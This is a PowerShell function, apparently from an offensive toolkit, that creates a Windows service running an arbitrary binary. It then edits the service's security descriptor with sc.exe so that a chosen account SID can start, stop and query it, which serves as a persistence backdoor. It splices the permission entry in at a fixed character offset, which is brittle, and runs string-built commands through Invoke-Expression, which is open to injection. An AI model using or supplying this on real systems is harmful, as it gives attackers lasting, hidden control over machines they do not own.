function Invoke-ServicePersistence {

    [CmdletBinding()]
    param(
        [Parameter(Position=0,Mandatory=$True)]
        [String]
        $BinPath,

        [Parameter(Position=2)]
        [String]
        $Name,

        [Parameter(Position=3,Mandatory=$True)]
        [String]
        $SID,

        [Parameter(Position=4)]
        [String]
        $DisplayName,

        [Parameter(Position=5)]
        [String]
        $Description,

        [Parameter(Position=6)]
        [String]
        $StartupType = "Manual"

    )

    $Service = "New-Service -Name '$Name' -BinaryPathName '$BinPath'"

    if ($DisplayName) { $Service += " -DisplayName '$DisplayName'" }
    if ($Description) { $Service += " -Description '$Description'" }
    if ($StartupType) { $Service += " -StartupType '$StartupType'" }

    Write-Verbose $Service

    Invoke-Expression $Service

    [string]$SDDL = C:\Windows\System32\sc.exe sdshow $Name
    $SDDL = $SDDL.TrimStart()
    $SDDL = $SDDL.Insert(110, "(A;;RPWPDTLO;;;$SID)")

    Write-Verbose $SDDL

    C:\Windows\System32\sc.exe sdset $Name $SDDL

}